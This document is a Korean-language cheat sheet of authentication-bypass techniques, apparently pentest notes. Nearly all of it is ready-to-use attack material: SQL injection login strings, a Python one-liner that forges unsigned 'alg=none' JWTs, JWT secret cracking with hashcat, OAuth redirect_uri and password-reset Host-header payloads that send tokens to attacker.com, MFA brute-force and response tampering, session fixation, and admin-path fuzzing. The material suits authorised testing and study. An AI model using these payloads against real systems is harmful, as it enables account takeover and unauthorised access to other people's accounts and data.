# Auth Bypass — 인증 우회 기법

## 기본 우회 페이로드
```
# SQL 인젝션 기반
admin'--
admin' #
admin'/*
' OR '1'='1'--
' OR 1=1--
admin' OR '1'='1
' OR ''='
' OR 1=1 LIMIT 1--

# PHP 타입 저글링
username=admin&password[]=
username=admin&password=true
```

## JWT 공격
```bash
# 1. alg=none 공격
# Header: {"alg":"none","typ":"JWT"}
# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
# Payload: {"sub":"1","role":"admin"}
python3 -c "
import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin'}).encode()).rstrip(b'=')
print(f'{h.decode()}.{p.decode()}.')
"

# 2. RS256→HS256 알고리즘 혼동
# 공개키로 HMAC 서명
# alg을 HS256으로 바꾸고 서버 공개키로 sign

# 3. kid 인젝션
{"kid": "../../../../dev/null"}  # 빈 키로 서명 가능
{"kid": "key' UNION SELECT 'attacker_key'--"}  # SQL 인젝션

# 4. 약한 secret 브루트포스
hashcat -a 0 -m 16500 <JWT> wordlist.txt
python3 -c "
import hmac, hashlib, base64
for secret in ['secret','password','123456','key']:
    ...
"
```

## OAuth / SSO 우회
```
# redirect_uri 검증 미흡
redirect_uri=https://attacker.com/
redirect_uri=https://legitimate.com@attacker.com/
redirect_uri=https://legitimate.com.attacker.com/

# state 파라미터 없음 → CSRF
# 인증 코드 탈취 후 재사용

# PKCE 미적용 → code 인터셉트 후 교환

# nonce 미검증 → ID Token 재사용
```

## 비밀번호 리셋 취약점
```
# 토큰 예측 가능 (타임스탬프 기반 등)
# 토큰 재사용 (만료 미적용)
# Host 헤더 인젝션
Host: attacker.com
# → 리셋 링크가 attacker.com으로 발송됨

# 이메일 필드 조작
email=victim@target.com&email=attacker@attacker.com
email[]=victim@target.com&email[]=attacker@attacker.com
email=victim@target.com%0a%0dcc:attacker@attacker.com
```

## MFA / 2FA 우회
```
# 1. 코드 브루트포스 (속도 제한 없을 경우)
0000~9999 순차 시도

# 2. 이전 코드 재사용

# 3. 2FA 코드 응답 조작 (프록시로)
응답의 "success":false → "success":true 변경

# 4. OTP 헤더 제거
2FA 요청 단계 완전 스킵 후 보호 리소스 직접 접근

# 5. 백업 코드 브루트포스
8자리 숫자 → 10^8 경우의 수
```

## 세션 관련
```
# 세션 고정 공격
1. 로그인 전 세션 ID 획득
2. 피해자에게 해당 세션 ID 전달 (링크, XSS 등)
3. 피해자 로그인 후 해당 세션 ID로 접근

# 세션 예측
세션 토큰이 단순 타임스탬프, MD5(username+timestamp) 등

# 쿠키 플래그 누락
Secure 없음 → HTTP 스니핑
HttpOnly 없음 → XSS로 탈취
SameSite=None → CSRF 가능
```

## 강제 브라우징 (Forced Browsing)
```
# 관리자 페이지
/admin
/administrator
/admin.php
/wp-admin/
/manager/
/management/
/dashboard/
/cpanel/
/controlpanel/
/backend/
/superadmin/

# API 직접 접근
/api/admin/users
/api/v1/admin/
/api/internal/

# ffuf로 발견
ffuf -u https://target/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## HTTP 메서드 우회
```
# HEAD, OPTIONS, TRACE 허용 확인
curl -X OPTIONS https://target/admin/
curl -X TRACE https://target/admin/

# 메서드 오버라이드
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
_method=PUT (form field)
```
